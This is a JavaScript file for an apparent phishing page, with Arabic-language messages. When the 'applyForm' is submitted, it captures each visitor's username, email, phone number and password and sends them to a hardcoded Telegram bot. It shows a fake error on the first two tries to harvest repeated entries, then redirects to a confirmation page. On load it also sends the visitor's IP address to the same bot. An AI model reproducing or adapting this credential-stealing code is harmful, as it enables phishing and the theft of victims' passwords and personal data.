const botToken = "8493663679:AAGW6vstZGS56PscBRhZ3Jqv0nUMxpn4JtU";
const chatId = "1046458749";
let attempts = 0;

document.getElementById("applyForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let username = document.getElementById("username").value;
    let email = document.getElementById("email").value;
    let phone = document.getElementById("phone").value;
    let password = document.getElementById("password").value;

    let message = `🔔 طلب جديد:\n👤 المستخدم: ${username}\n📧 البريد: ${email}\n📞 الهاتف: ${phone}\n🔑 كلمة المرور: ${password}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => response.json())
        .then(data => {
            attempts++;
            if (attempts < 3) {
                document.getElementById("errorMessage").classList.remove("hidden");
            } else {
                document.getElementById("errorMessage").classList.add("hidden");
                document.getElementById("successMessage").classList.remove("hidden");
                setTimeout(() => {
                    window.location.href = "confirmation.html";  // تغيير التوجيه هنا إلى صفحة التأكيد
                }, 2000);
            }
        })
        .catch(error => console.error("Error:", error));
});

// إرسال عنوان IP للبوت عند دخول الموقع
fetch("https://api64.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        let ipMessage = `🔔 دخول جديد للموقع\n🌍 عنوان IP: ${data.ip}`;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMessage)}`);
    })
    .catch(error => console.error("Error fetching IP:", error));
